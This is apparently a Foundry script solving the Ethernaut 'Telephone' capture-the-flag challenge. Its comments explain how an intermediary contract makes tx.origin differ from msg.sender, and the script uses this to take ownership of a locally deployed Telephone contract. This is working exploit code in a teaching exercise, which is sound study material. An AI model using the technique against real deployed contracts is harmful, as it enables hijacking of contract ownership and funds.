// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneSolution is Script {
    // $ forge script script/Telephone.s.sol --tc TelephoneSolution

    function run() external {
        Telephone telephoneInstance = new Telephone();
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        // ---- Attack Starts From here ---

        // - As you can see in the `Telephone` contract, to change the owner `tx,origin` differs from `msg.sender`.
        // - `tx.origin`: original sender of the transaction. If the transaction calls another contract, `tx.origin` will always point to the external address that initiated the transaction.
        // - If the caller called only one function, `tx.origin` will be the same as `msg.sender`.
        // - If the tx calls a function that calls another function in a contract, `msg.sender` changes, but the `tx.origin` doesn't change.
        // - So to claim the ownership we need to make a contract that calls `Telephone::changeOwner` function,  then call the function that calls the `changeOwner` function in `Telephone` contract.
        // - We will path the test and change the owner of the contract.

        vm.startPrank(attacker);
        TelephoneAttack attackContract = new TelephoneAttack(address(telephoneInstance));

        console.log("owner:", telephoneInstance.owner());
        attackContract.attack();
        console.log("new owner:", telephoneInstance.owner());

        vm.stopPrank();
    }
}

contract TelephoneAttack {
    Telephone telephoneInstance;

    constructor(address target) {
        telephoneInstance = Telephone(target);
    }

    function attack() public {
        telephoneInstance.changeOwner(msg.sender);
    }
}
